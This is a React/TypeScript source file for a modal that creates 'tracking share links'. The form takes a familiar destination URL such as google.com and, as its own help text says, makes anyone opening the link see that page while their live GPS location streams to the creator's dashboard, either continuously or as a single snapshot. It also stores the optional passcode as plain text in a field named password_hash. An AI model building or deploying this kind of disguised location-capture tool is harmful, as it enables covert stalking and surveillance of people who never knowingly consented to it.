import React, { useState } from 'react';
import { supabase, isSupabaseConfigured, getLocalShares, saveLocalShares } from '../lib/supabase';
import type { ShareItem } from '../lib/supabase';
import { useAuth } from '../context/AuthContext';
import { Lock, Clock, Navigation, Radio, AlertTriangle, Link as LinkIcon } from 'lucide-react';
import confetti from 'canvas-confetti';

interface CreateShareModalProps {
  isOpen: boolean;
  onClose: () => void;
  onCreated: (share: ShareItem) => void;
}

export const CreateShareModal: React.FC<CreateShareModalProps> = ({ isOpen, onClose, onCreated }) => {
  const { user } = useAuth();
  const [title, setTitle] = useState('Tactical Link Node');
  const [targetUrl, setTargetUrl] = useState('');
  const [mode, setMode] = useState<'continuous' | 'once'>('continuous');
  const [expirationOption, setExpirationOption] = useState<'10m' | '1h' | '24h' | 'never'>('1h');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError(null);

    let formattedUrl = targetUrl.trim();
    if (formattedUrl && !/^https?:\/\//i.test(formattedUrl)) {
      formattedUrl = 'https://' + formattedUrl;
    }

    let expiresAt: string | null = null;
    const now = new Date();
    if (expirationOption === '10m') {
      expiresAt = new Date(now.getTime() + 10 * 60 * 1000).toISOString();
    } else if (expirationOption === '1h') {
      expiresAt = new Date(now.getTime() + 60 * 60 * 1000).toISOString();
    } else if (expirationOption === '24h') {
      expiresAt = new Date(now.getTime() + 24 * 60 * 60 * 1000).toISOString();
    }

    const uuidToken = crypto.randomUUID();

    const newShareData: Omit<ShareItem, 'id'> = {
      user_id: user?.id || undefined,
      uuid: uuidToken,
      title: title.trim() || 'Tactical Link Node',
      target_url: formattedUrl || null,
      mode: mode,
      active: true,
      created_at: new Date().toISOString(),
      expires_at: expiresAt,
      password_hash: password.trim() ? password.trim() : null,
      passcode_hint: password.trim() ? 'Protected Node' : null,
    };

    let createdShare: ShareItem;

    try {
      if (isSupabaseConfigured) {
        const { data, error: sbErr } = await supabase
          .from('shares')
          .insert([newShareData])
          .select('*')
          .single();

        if (sbErr) throw sbErr;
        createdShare = data as ShareItem;
      } else {
        const fakeId = 'share-' + Date.now();
        createdShare = { id: fakeId, ...newShareData };
        const current = getLocalShares();
        saveLocalShares([createdShare, ...current]);
      }

      confetti({ particleCount: 50, spread: 70, origin: { y: 0.7 } });
      onCreated(createdShare);
      onClose();
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'Failed creating location share node');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-[5000] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md font-mono">
      <div className="relative w-full max-w-lg bg-cyber-bg border border-cyber-teal/60 rounded-xl p-6 shadow-neon-teal">
        <div className="flex items-center justify-between border-b border-cyber-teal/30 pb-3 mb-5">
          <div className="flex items-center gap-2 text-cyber-teal font-bold">
            <Radio className="w-5 h-5 text-cyber-teal animate-pulse" />
            <span>CREATE TRACKING SHARE LINK</span>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-cyber-teal">✕</button>
        </div>

        {error && (
          <div className="mb-4 p-3 bg-cyber-red/20 border border-cyber-red/50 rounded text-cyber-red text-xs flex items-center gap-2">
            <AlertTriangle className="w-4 h-4" /> {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4 text-xs">
          {/* Target URL Input */}
          <div>
            <label className="block text-gray-300 mb-1 font-bold text-cyber-teal flex items-center gap-1">
              <LinkIcon className="w-3.5 h-3.5" /> DESTINATION / EXISTING URL (e.g., google.com, youtube.com)
            </label>
            <input
              type="text"
              value={targetUrl}
              onChange={(e) => setTargetUrl(e.target.value)}
              placeholder="https://google.com or any web link..."
              className="w-full bg-black/60 border border-cyber-teal/50 rounded px-3 py-2 text-cyber-teal focus:outline-none focus:border-cyber-teal font-bold"
            />
            <p className="text-[10px] text-gray-400 mt-1">
              When anyone opens the generated link, they will see this content while sending their live GPS location to your dashboard!
            </p>
          </div>

          <div>
            <label className="block text-gray-300 mb-1 font-bold">NODE TITLE / NAME</label>
            <input
              type="text"
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              placeholder="e.g. Google Search Proxy Node"
              className="w-full bg-black/60 border border-cyber-border rounded px-3 py-2 text-gray-200 focus:outline-none focus:border-cyber-teal"
              required
            />
          </div>

          <div>
            <label className="block text-gray-300 mb-1 font-bold">TRANSMISSION MODE</label>
            <div className="grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={() => setMode('continuous')}
                className={`p-3 rounded border text-left flex flex-col gap-1 transition-all ${
                  mode === 'continuous'
                    ? 'bg-cyber-teal/20 border-cyber-teal text-cyber-teal shadow-neon-teal'
                    : 'bg-black/40 border-cyber-border text-gray-400'
                }`}
              >
                <div className="font-bold flex items-center gap-1">
                  <Navigation className="w-4 h-4" /> Continuous Telemetry
                </div>
                <span className="text-[10px] opacity-80">Streams live GPS updates every 10 sec</span>
              </button>

              <button
                type="button"
                onClick={() => setMode('once')}
                className={`p-3 rounded border text-left flex flex-col gap-1 transition-all ${
                  mode === 'once'
                    ? 'bg-cyber-teal/20 border-cyber-teal text-cyber-teal shadow-neon-teal'
                    : 'bg-black/40 border-cyber-border text-gray-400'
                }`}
              >
                <div className="font-bold flex items-center gap-1">
                  <Radio className="w-4 h-4" /> Share Once (Single Ping)
                </div>
                <span className="text-[10px] opacity-80">Captures single GPS snapshot</span>
              </button>
            </div>
          </div>

          <div>
            <label className="block text-gray-300 mb-1 font-bold flex items-center gap-1">
              <Clock className="w-3.5 h-3.5 text-cyber-yellow" /> AUTO-DESTRUCT / EXPIRATION
            </label>
            <div className="grid grid-cols-4 gap-2">
              {(['10m', '1h', '24h', 'never'] as const).map((opt) => (
                <button
                  key={opt}
                  type="button"
                  onClick={() => setExpirationOption(opt)}
                  className={`py-2 rounded border uppercase font-bold transition-all text-center ${
                    expirationOption === opt
                      ? 'bg-cyber-yellow/20 border-cyber-yellow text-cyber-yellow'
                      : 'bg-black/40 border-cyber-border text-gray-400'
                  }`}
                >
                  {opt === 'never' ? 'Infinity' : opt}
                </button>
              ))}
            </div>
          </div>

          <div>
            <label className="block text-gray-300 mb-1 font-bold flex items-center gap-1">
              <Lock className="w-3.5 h-3.5 text-cyber-green" /> PASSCODE PROTECTION (OPTIONAL)
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Leave blank for open access link"
              className="w-full bg-black/60 border border-cyber-border rounded px-3 py-2 text-cyber-green focus:outline-none focus:border-cyber-green"
            />
          </div>

          <div className="pt-3 border-t border-cyber-teal/30 flex justify-end gap-3">
            <button
              type="button"
              onClick={onClose}
              className="px-4 py-2 border border-cyber-border text-gray-400 hover:text-white rounded"
            >
              CANCEL
            </button>
            <button
              type="submit"
              disabled={isSubmitting}
              className="px-5 py-2 bg-cyber-teal/20 border border-cyber-teal hover:bg-cyber-teal/30 text-cyber-teal font-bold rounded shadow-neon-teal flex items-center gap-2"
            >
              {isSubmitting ? 'GENERATING SECURE LINK...' : 'GENERATE TRACKING LINK'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
